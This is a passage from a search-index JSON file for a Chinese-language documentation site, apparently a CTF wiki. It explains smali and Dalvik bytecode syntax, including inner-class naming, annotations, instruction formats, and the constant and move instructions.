<\u63a5\u53e3\u540d\u79f0> \u7ed9\u4e2a\u4f8b\u5b50\uff0c\u4e00\u822c\u6765\u8bf4\uff0csmali\u90fd\u4f1a\u5bf9\u5176\u8fdb\u884c\u6ce8\u91ca\u8868\u660e\u5b83\u662f\u4e00\u4e2a\u63a5\u53e3\u3002 # interfaces .implements L android/view/ View$OnClickListener ;","title":"\u63a5\u53e3"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_15","text":"Java\u4e2d\u5141\u8bb8\u5728\u4e00\u4e2a\u7c7b\u4e2d\u5b9a\u4e49\u53e6\u5916\u4e00\u4e2a\u7c7b\uff0c\u8fd8\u5141\u8bb8\u591a\u5c42\u5d4c\u5957\uff0c\u6211\u4eec\u79f0\u7c7b\u4e2d\u7684\u7c7b\u4e3a\u5185\u90e8\u7c7b\u3002\u5185\u90e8\u7c7b\u4e3b\u8981\u6709 \u6210\u5458\u5185\u90e8\u7c7b \u9759\u6001\u5d4c\u5957\u7c7b \u65b9\u6cd5\u5185\u90e8\u7c7b \u533f\u540d\u5185\u90e8\u7c7b \u5728smali\u4e2d\uff0c\u6bcf\u4e2a\u7c7b\u90fd\u4f1a\u5bf9\u5e94\u4e00\u4e2asmali\u6587\u4ef6\u3002","title":"\u7c7b\u7684\u7c7b\u522b"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_16","text":"\u5728smali\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 this \u6765\u8868\u793a\u7236\u7c7b\u7684\u5f15\u7528\uff0c\u5bf9\u4e8e\u7236\u7c7b\u7684\u4e2d\u7684\u5b50\u7c7b\uff0c\u6211\u4eec\u4f1a\u6839\u636e\u5176\u5c42\u6570\u6765\u8fdb\u884c\u5f15\u7528\uff0c\u5176\u683c\u5f0f\u4e3a this$[\u5c42\u6570] \uff0c\u4e3e\u4e2a\u4f8b\u5b50 public class MainActivity extends Activity { //this$0 public class firstinner //this$1 { public class secondinner //this$2 { public class thirdinner //this$3 { } } } } \u6bd4\u5982\u8bf4 thirdinner \u5f15\u7528 firstinner \u5176\u4f1a\u4f7f\u7528 this$1 \u6765\u8fdb\u884c\u5f15\u7528\u3002\u800c\u4e14\uff0c\u5bf9\u4e8e this$x \u8fd9\u6837\u7684\u5b57\u6bb5\u90fd\u4f1a\u88ab\u5b9a\u4e49\u4e3a synthetic \u7c7b\u578b\uff0c\u8868\u660e\u8fd9\u79cd\u5b57\u6bb5\u662f\u7531\u7f16\u8bd1\u5668\u81ea\u52a8\u751f\u6210\u7684\uff0c\u5728\u6e90\u4ee3\u7801\u91cc\u5e76\u6ca1\u6709\u8fd9\u6837\u7684\u5b57\u6bb5\u3002 \u6b64\u5916\uff0c\u5728smali\u4e2d\uff0c\u6bcf\u4e2a\u7c7b\u90fd\u4f1a\u5bf9\u5e94\u4e00\u4e2a smali \u6587\u4ef6\uff0c\u8fd9\u51e0\u4e2a\u7c7b\u5bf9\u5e94\u7684 smali \u6587\u4ef6\u540d\u5206\u522b\u4e3a MainActivity.smali MainActivity$firstinner.smali MainActivity$firstinner$secondinner.smali MainActivity$firstinner$thirdinner.smali","title":"\u7c7b\u7684\u5f15\u7528"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_17","text":"\u6ce8\u89e3\u7684\u683c\u5f0f\u5982\u4e0b #annotations .annotation [ \u6ce8\u89e3\u7684\u5c5e\u6027] <\u6ce8\u89e3\u8303\u56f4> [ \u6ce8\u89e3\u5b57\u6bb5 = \u503c] ... . end \u5176\u4e2d\uff0c\u5982\u679c\u6ce8\u89e3\u8303\u56f4\u662f\u7c7b\u7684\u8bdd\uff0c\u6ce8\u89e3\u4f1a\u76f4\u63a5\u51fa\u73b0\u5728 smali \u6587\u4ef6\u4e2d\u3002\u5982\u679c\u6ce8\u89e3\u8303\u56f4\u662f\u65b9\u6cd5\u6216\u8005\u5b57\u6bb5\u7684\u8bdd\uff0c\u4f1a\u5305\u542b\u5728\u76f8\u5e94\u7684\u65b9\u6cd5\u6216\u8005\u5b57\u6bb5\u7684\u5b9a\u4e49\u4e2d\u3002","title":"\u6ce8\u89e3"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_18","text":"\u8fd9\u91cc\u90e8\u5206\u53c2\u8003http://blog.csdn.net/wizardforcel/article/details/54730253\u3002","title":"\u6267\u884c\u8bed\u53e5"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#dalvik","text":"\u5728\u4ecb\u7ecd smali \u8bed\u6cd5\u4e2d\u7684\u6307\u4ee4\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b Dalvik \u6307\u4ee4\u7684\u57fa\u672c\u683c\u5f0f\u3002 Dalvik \u4e2d\u6307\u4ee4\u7684\u683c\u5f0f\u4e3b\u8981\u5305\u542b\u4e24\u4e2a\u65b9\u9762\uff1a\u4f4d\u63cf\u8ff0\uff0c\u683c\u5f0fID\u3002\u76ee\u524d Dalvik \u4e2d\u57fa\u672c\u4e0a\u6240\u6709\u7684\u6307\u4ee4\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5176\u4e2d\u7b2c\u4e00\u5217\u7ed9\u51fa\u4e86\u6307\u4ee4\u6309\u7167\u4f4d\u8fdb\u884c\u63cf\u8ff0\u7684\u683c\u5f0f\uff0c\u7b2c\u4e8c\u5217\u662f\u683c\u5f0f\u5316 ID \uff0c\u7b2c\u4e09\u5217\u8868\u793a\u76f8\u5e94\u7684\u53e5\u6cd5\uff0c\u7b2c\u56db\u5217\u5bf9\u5176\u8fdb\u884c\u8bf4\u660e\u3002","title":"Dalvik\u6307\u4ee4\u683c\u5f0f"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_19","text":"\u5728\u4f4d\u63cf\u8ff0\u4e2d\uff0cDavik \u4e2d\u7684\u6bcf\u4e00\u7c7b\u6307\u4ee4\u4e00\u822c\u7531\u5982\u4e0b\u7684\u5143\u7d20\u6784\u6210 \u4e00\u4e2aop\uff0c8\u4f4d\u6307\u4ee4\u7801 \u82e5\u5e72\u4e2a\u5b57\u7b26\uff0c\u6bcf\u4e00\u4e2a\u5b57\u7b26\u8868\u793a4\u4f4d \u82e5\u5e72\u4e2a | \uff0c\u8fdb\u884c\u5206\u5272\uff0c\u65b9\u4fbf\u9605\u8bfb\u3002 \u82e5\u5e72\u4e2a \\varnothing \\varnothing \uff0c\u540c\u6837\u4e5f\u662f4\u4e2a\u5b57\u7b26\uff0c\u8868\u793a\u8be5\u90e8\u5206\u4f4d\u4e3a0\u3002 \u6b64\u5916\uff0c\u5728\u4e0a\u9762\u7684\u5c55\u73b0\u5f62\u5f0f\u79cd\uff0c\u6307\u4ee4\u7531\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u7a7a\u683c\u5206\u5272\u7684 16 \u4f4d\u7684 word \u7ec4\u6210\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a word \u53ef\u4ee5\u5305\u542b\u4e0a\u8ff0\u7684\u51e0\u4e2a\u5143\u7d20\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6307\u4ee4 B|A|op CCCC \u5305\u542b2\u4e2a word\uff0c\u4e00\u5171 32 \u4f4d\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u5b57\u7684\u4f4e 8 \u4f4d\u662f\u64cd\u4f5c\u7801\uff0c\u4e2d\u95f4 4 \u4f4d\u662fA\uff0c\u9ad84\u4f4d\u662fB\u3002\u7b2c\u4e8c\u4e2a\u5b57\u662f\u5355\u72ec\u768416\u4f4d\u7684\u6570\u503c\u3002","title":"\u4f4d\u63cf\u8ff0"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#id","text":"\u4f46\u662f\uff0c\u6b63\u5982\u8868\u683c\u91cc\u6240\u5c55\u73b0\u7684 \u8fd9\u6837\u7684\u4e00\u79cd\u6307\u4ee4\u683c\u5f0f\uff0c\u6839\u636eID\u7684\u4e0d\u540c\uff0c\u4ecd\u7136\u53ef\u4ee5\u8868\u793a\u4e0d\u540c\u7684\u6307\u4ee4\u542b\u4e49\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0fID\u7531\u82e5\u5e72\u4e2a\u5b57\u7b26\u7ec4\u6210\uff0c\u4e00\u822c\u6765\u8bf4\u5305\u542b3\u4e2a\u5b57\u7b26 \u7b2c\u4e00\u4e2a\u6570\u5b57\u8868\u793aword\u7684\u6570\u91cf \u7b2c\u4e8c\u4e2a \u6570\u5b57\u7684\u8bdd\uff0c\u8868\u793a\u6307\u4ee4\u5305\u542b\u7684\u5bc4\u5b58\u5668\u7684\u6700\u5927\u6570\u91cf\uff08\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u6307\u4ee4\u53ef\u4ee5\u5305\u542b\u4e0d\u5b9a\u4e2a\u6570\u7684\u5bc4\u5b58\u5668\uff09 r\u7684\u8bdd\uff0c\u8868\u793a\u4f7f\u7528\u4e86\u4e00\u5b9a\u8303\u56f4\u5185\u7684\u5bc4\u5b58\u5668(range)\u3002 \u7b2c\u4e09\u4e2a\u5b57\u7b26\u8868\u793a\u6307\u4ee4\u4f7f\u7528\u5230\u7684\u989d\u5916\u6570\u636e\u7684\u7c7b\u578b\u3002\u5982\u4e0b\u8868 Mnemonic Bit Sizes Meaning b 8 immediate signed byte c 16, 32 constant pool index f 16 interface constants (only used in statically linked formats) h 16 immediate signed hat (high-order bits of a 32- or 64-bit value; low-order bits are all 0 ) i 32 immediate signed int, or 32-bit float l 64 immediate signed long, or 64-bit double m 16 method constants (only used in statically linked formats) n 4 immediate signed nibble s 16 immediate signed short t 8, 16, 32 branch target x 0 no additional data \u5982\u679c\u5b58\u5728\u7b2c\u56db\u4e2a\u5b57\u7b26\u7684\u8bdd s\u8868\u793a\u91c7\u7528\u9759\u6001\u94fe\u63a5 i\u8868\u793a\u6307\u4ee4\u5e94\u8be5\u88ab\u5185\u8054\u5904\u7406\u3002","title":"\u683c\u5f0fID"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_20","text":"\u5176\u57fa\u672c\u8981\u6c42\u5982\u4e0b \u6307\u4ee4\u4ee5\u64cd\u4f5c\u7801op\u5f00\u59cb\uff0c\u540e\u9762\u76f4\u63a5\u8ddf\u4e0a\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53c2\u6570\uff0c\u53c2\u6570\u95f4\u4ee5\u9017\u53f7\u5206\u9694\u3002 \u6307\u4ee4\u7684\u53c2\u6570\u4ece\u6307\u4ee4\u7b2c\u4e00\u90e8\u5206\u5f00\u59cb\uff0cop\u4f4d\u4e8e\u4f4e8\u4f4d\uff0c\u9ad88\u4f4d\u53ef\u4ee5\u662f\u4e00\u4e2a8\u4f4d\u7684\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e24\u4e2a4\u4f4d\u7684\u53c2\u6570\uff0c\u8fd8\u53ef\u4ee5\u4e3a\u7a7a\u3002\u5982\u679c\u6307\u4ee4\u8d85\u8fc716\u4f4d\uff0c\u5219\u540e\u9762\u90e8\u5206\u4f9d\u6b21\u4f5c\u4e3a\u53c2\u6570\u3002 \u53c2\u6570 Vx \u8868\u793a\u5bc4\u5b58\u5668\uff0c\u5982v0\u3001v1\u7b49\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u91c7\u7528v\u800c\u4e0d\u7528r\u662f\u4e3a\u4e86\u907f\u514d\u4e0e\u5b9e\u73b0\u8be5\u865a\u62df\u673a\u67b6\u6784\u7684\u673a\u5668\u67b6\u6784\u4e2d\u7684\u5bc4\u5b58\u5668\u547d\u540d\u4ea7\u751f\u51b2\u7a81\u3002 \u53c2\u6570 #+X \u8868\u793a\u5e38\u91cf\u6570\u5b57\u3002 \u53c2\u6570 +X \u8868\u793a\u76f8\u5bf9\u6307\u4ee4\u7684\u5730\u5740\u504f\u79fb\u3002 \u53c2\u6570 kind@X \u8868\u793a\u5e38\u91cf\u6c60\u7d22\u5f15\u503c\uff0c\u5176\u4e2dkind\u8868\u793a\u5e38\u91cf\u6c60\u7c7b\u578b\uff0c\u53ef\u4ee5\u662f\u4ee5\u4e0b\u56db\u79cd\u7c7b\u578b string\uff0c\u5b57\u7b26\u4e32\u5e38\u91cf\u6c60\u7d22\u5f15 type\uff0c\u7c7b\u578b\u5e38\u91cf\u6c60\u7d22\u5f15 field\uff0c\u5b57\u6bb5\u5e38\u91cf\u6c60\u7d22\u5f15 meth\uff0c\u65b9\u6cd5\u5e38\u91cf\u6c60\u7d22\u5f15 \u4ee5\u6307\u4ee4 op vAA, type@BBBB \u4e3a\u4f8b\uff0c\u6307\u4ee4\u4f7f\u7528\u4e861\u4e2a\u5bc4\u5b58\u5668vAA\uff0c\u4e00\u4e2a32\u4f4d\u7684\u7c7b\u578b\u5e38\u91cf\u6c60\u7d22\u5f15\u3002","title":"\u53e5\u6cd5"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_21","text":"Dalvik\u6307\u4ee4\u5728\u8c03\u7528\u89c4\u8303\u4e0a\u5927\u81f4\u6a21\u4eff\u5e38\u89c1\u7684\u67b6\u6784\u548c C \u6837\u5f0f\u7684\u8c03\u7528\u89c4\u8303\uff0c\u5982\u4e0b \u53c2\u6570\u987a\u5e8f\u4e3a Dest-then-source \u3002 \u5229\u7528\u540e\u7f00\u7528\u6765\u8868\u660e\u8fd0\u7b97\u7c7b\u578b\uff0c\u4ece\u800c\u6d88\u9664\u6b67\u4e49\uff1a \u6b63\u5e38\u768432 \u4f4d\u8fd0\u7b97\u4e0d\u6807\u8bb0\u3002 \u6b63\u5e38\u573064 \u4f4d\u8fd0\u7b97\u4ee5 -wide \u4e3a\u540e\u7f00\u3002 \u7279\u5b9a\u7c7b\u578b\u7684\u8fd0\u7b97\u7801\u4ee5\u5176\u7c7b\u578b\uff08\u6216\u7b80\u5355\u7f29\u5199\uff09\u4e3a\u540e\u7f00\uff0c\u8fd9\u4e9b\u7c7b\u578b\u5305\u62ec\uff1a -boolean \u3001 -byte \u3001 -char \u3001 -short \u3001 -int \u3001 -long \u3001 -float \u3001 -double \u3001 -object \u3001 -string \u3001 -class \u548c -void \u3002 \u5229\u7528\u8fd0\u7b97\u7801\u90e8\u5206\u540e\u7f00\u533a\u5206\u5177\u6709\u4e0d\u540c\u6307\u4ee4\u6837\u5f0f\u6216\u8005\u6216\u9009\u9879\u7684\u76f8\u540c\u8fd0\u7b97\uff0c\u8fd9\u4e9b\u540e\u7f00\u4e0e\u4e3b\u8981\u540d\u79f0\u4e4b\u95f4\u4ee5 / \u5206\u5f00\uff0c\u4e3b\u8981\u76ee\u7684\u662f\u4f7f\u751f\u6210\u548c\u89e3\u6790\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u4e2d\u5b58\u5728\u4e0e\u9759\u6001\u5e38\u91cf\u7684\u4e00\u5bf9\u4e00\u6620\u5c04\u5173\u7cfb\uff0c\u4ee5\u4fbf\u4e8e\u964d\u4f4e\u8ba9\u8bfb\u8005\u611f\u5230\u6a21\u7cca\u4e0d\u6e05\u7684\u53ef\u80fd\u6027\u3002 \u4f8b\u5982\uff0c\u5728\u6307\u4ee4 move-wide/from16 vAA, vBBBB \u4e2d move \u4e3a\u57fa\u7840\u8fd0\u7b97\u7801\uff0c\u8868\u793a\u8fd9\u662f\u57fa\u672c\u8fd0\u7b97\uff0c\u7528\u6765\u79fb\u52a8\u5bc4\u5b58\u5668\u7684\u503c\u3002 wide \u4e3a\u540d\u79f0\u540e\u7f00\uff0c\u8868\u793a\u6307\u4ee4\u5bf964 \u4f4d\u6570\u636e\u8fdb\u884c\u8fd0\u7b97\u3002 from16 \u4e3a\u8fd0\u7b97\u7801\u540e\u7f00\uff0c\u8868\u793a\u6e90\u4e3a\u4e00\u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\u7684\u5f15\u7528\u53d8\u91cf\u3002 vAA \u4e3a\u76ee\u7684\u5bc4\u5b58\u5668\uff0c\u53d6\u503c\u8303\u56f4\u4e3a v0 - v255 \u3002 vBBBB \u4e3a\u6e90\u5bc4\u5b58\u5668\uff0c\u53d6\u503c\u8303\u56f4\u4e3a v0 - v65535 \u3002","title":"\u6307\u4ee4\u7279\u70b9"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_22","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u5177\u4f53\u4ecb\u7ecd\u4f9d\u6b21\u6bcf\u4e00\u6761\u6307\u4ee4\u7684\u542b\u4e49\uff0c\u5e76\u5c3d\u53ef\u80fd\u5730\u5bf9\u5176\u8fdb\u884c\u5206\u7c7b\u3002","title":"\u5177\u4f53\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_23","text":"nop\u6307\u4ee4\uff0c\u65e0\u4efb\u4f55\u64cd\u4f5c\uff0c\u4e00\u822c\u7528\u4e8e\u5bf9\u9f50\u4ee3\u7801\u3002","title":"\u7a7a\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_24","text":"op&id \u8bed\u6cd5 \u53c2\u6570 \u8bf4\u660e 2 11n const/4 vA, #+B A: \u76ee\u6807\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff084 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 32 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 13 21s const/16 vAA, #+BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 32 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 14 31i const vAA, #+BBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u4efb\u610f 32 \u4f4d\u5e38\u91cf \u5c06\u7ed9\u5b9a\u7684\u503c\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 15 21h const/high16 vAA, #+BBBB0000 A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u53f3\u96f6\u6269\u5c55\u4e3a 32 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 16 21s const-wide/16 vAA, #+BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 64 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 17 31i const-wide/32 vAA, #+BBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0832 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 64 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 18 51l const-wide vAA, #+BBBBBBBBBBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u4efb\u610f\u53cc\u5b57\u5bbd\u5ea6\uff0864 \u4f4d\uff09\u5e38\u91cf \u5c06\u7ed9\u5b9a\u7684\u503c\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 19 21h const-wide/high16 vAA, #+BBBB000000000000 A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u53f3\u96f6\u6269\u5c55\u4e3a 64 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 1a 21c const-string vAA, string@BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u5b57\u7b26\u4e32\u7d22\u5f15 \u5c06\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u5f15\u7528\u8d4b\u503c\u7ed9\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 1b 31c const-string/jumbo vAA, string@BBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u5b57\u7b26\u4e32\u7d22\u5f15 \u5c06\u7ed9\u5b9a\u5b57\u7b26\u4e32\u5f15\u7528\uff08\u8f83\u5927\uff09\u8d4b\u503c\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 1c 21c const-class vAA, type@BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u7c7b\u578b\u7d22\u5f15 \u5c06\u7ed9\u5b9a\u7c7b\u5f15\u7528\u8d4b\u503c\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002\u5982\u679c\u6307\u5b9a\u7684\u7c7b\u578b\u662f\u539f\u59cb\u7c7b\u578b\uff0c\u5219\u5c06\u5b58\u50a8\u5bf9\u539f\u59cb\u7c7b\u578b\u7684\u9000\u5316\u7c7b\u7684\u5f15\u7528\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u679cjava\u4ee3\u7801\u5982\u4e0b boolean z = true ; z = false ; byte b = 1 ; short s = 2 ; int i = 3 ; long l = 4 ; float f = 0.1f ; double d = 0.2 ; String str = \"test\" ; Class c = Object . class ; \u90a3\u4e48\u7f16\u8bd1\u4e4b\u540e\u5f97\u5230\u7684\u4ee3\u7801\u5982\u4e0b const/4 v10 , 0x1 const/4 v10 , 0x0 const/4 v0 , 0x1 const/4 v8 , 0x2 const/4 v5 , 0x3 const-wide/16 v6 , 0x4 const v4 , 0x3dcccccd # 0.1f const-wide v2 , 0x3fc999999999999a L # 0.2 const-string v9 , \"test\" const-class v1 , L java/lang/ Object ; \u53ef\u4ee5\u770b\u51fa\uff0c\u6839\u636e\u6570\u636e\u7c7b\u578b\u5927\u5c0f\u7684\u4e0d\u540c\uff0c\u4f1a\u91c7\u7528\u4e0d\u540c\u7684\u8bed\u6cd5\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230float\u7684\u5b57\u9762\u503c\u662f0x3dcccccd\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f0.1\u3002\u5173\u4e8e\u6d6e\u70b9\u6570\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u5b58\u5728\u5f62\u5f0f\uff0c\u8bf7\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0csmali\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u5c06string\u7684id\u8f6c\u6362\u4e3a\u5176\u771f\u6b63\u7684\u5b57\u7b26\u4e32\u3002","title":"\u6570\u636e\u5b9a\u4e49\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_25","text":"\u6570\u636e\u79fb\u52a8\u6307\u4ee4\u4e3b\u8981\u662f\u5c06\u6570\u636e\u4ece\u4e00\u4e2a\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u4e2d\u79fb\u52a8\u5230\u53e6\u4e00\u5904\u3002 op&id \u8bed\u6cd5 \u53c2\u6570 \u8bf4\u660e 01 12x move vA, vB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 vA=vB 02 22x move/from16 vAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 vAA=vBBBB 03 32x move/16 vAAAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 vAAAA=VBBBB 04 12x move-wide vA, vB A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff084 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\u5bf9\uff084 \u4f4d\uff09 vA\uff0cv(A+1)=vB\uff0cV(B+1) 05 22x move-wide/from16 vAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff088 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\u5bf9(16 bit) vAA\uff0cv(AA+1)=vBBBB\uff0cV(BBBB+1) 06 32x move-wide/16 vAAAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff0816 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\u5bf9(16 bit) vAAAA\uff0cv(AAAA+1)=vBBBB\uff0cV(BBBB+1) 07 12x move-object vA, vB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 \u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\uff0cvA=vB 08 22x move-object/from16 vAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 \u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\uff0cvAA=vBBBB 09 32x move-object/16 vAAAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 \u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\uff0cvAAAA=vBBBB 0a 11x move-result vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 \u5c06\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c\u653e\u5230VAA\u5bc4\u5b58\u5668\u4e2d\u3002 0b 11x move-result-wide vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff088 \u4f4d\uff09 \u5c06\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c\u653e\u5230VAA\u5bc4\u5b58\u5668\u4e2d\u3002 0c 11x move-result-object vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 \u5c06\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u5bf9\u8c61\u5f15\u7528VAA\u5bc4\u5b58\u5668\u4e2d\u3002 0d 11x move-exception vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 \u5c06\u6355\u83b7\u7684\u5f02\u5e38\u4fdd\u5b58\u5230\u7ed9\u5b9a\u5bc4\u5b58\u5668\u4e2d\u3002 \u5176\u4e2d\uff0c move \u7cfb\u5217\u6307\u4ee4\u4ee5\u53ca move-result \u7528\u4e8e\u5904\u7406\u5c0f\u4e8e\u7b49\u4e8e 32 \u4f4d\u7684\u57fa\u672c\u7c7b\u578b\u3002 move-wide \u7cfb\u5217\u6307\u4ee4\u548c move-result-wide \u7528\u4e8e\u5904\u740664\u4f4d\u7c7b\u578b\uff0c\u5305\u62ec long \u548c double \u7c7b\u578b\u3002 move-object \u7cfb\u5217\u6307\u4ee4\u548c move-result-object \u7528\u4e8e\u5904\u7406\u5bf9\u8c61\u5f15\u7528\u3002 \u6b64\u5916\uff0c\u540e\u7f00\uff08 /from16 \u3001 /16 \uff09\u53ea\u5f71\u54cd\u5b57\u8282\u7801\u7684\u4f4d\u6570\u548c\u5bc4\u5b58\u5668\u7684\u8303\u56f4\uff0c\u4e0d\u5f71\u54cd\u6307\u4ee4\u7684\u903b\u8f91\u3002","title":"\u6570\u636e\u79fb\u52a8"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_26","text":"\u6570\u636e\u8f6c\u6362\u6307\u4ee4\u4e3b\u8981\u662f\u5c06\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002\u76ee\u524d\u5df2\u6709\u7684\u6307\u4ee4\u5982\u4e0b \u6307\u4ee4 \u8bf4\u660e neg-int \u5bf9\u6574\u578b\u6570\u6c42\u8865 not-int \u5bf9\u6574\u578b\u6570\u6c42\u53cd neg-long \u5bf9\u957f\u6574\u578b\u6570\u6c42\u8865 not-long \u5bf9\u957f\u6574\u578b\u6570\u6c42\u53cd neg-float \u5bf9\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570\u6c42\u8865 neg-double \u5bf9\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570\u6c42\u8865 int-to-long \u5c06\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u957f\u6574\u578b int-to-float \u5c06\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570 int-to-dobule 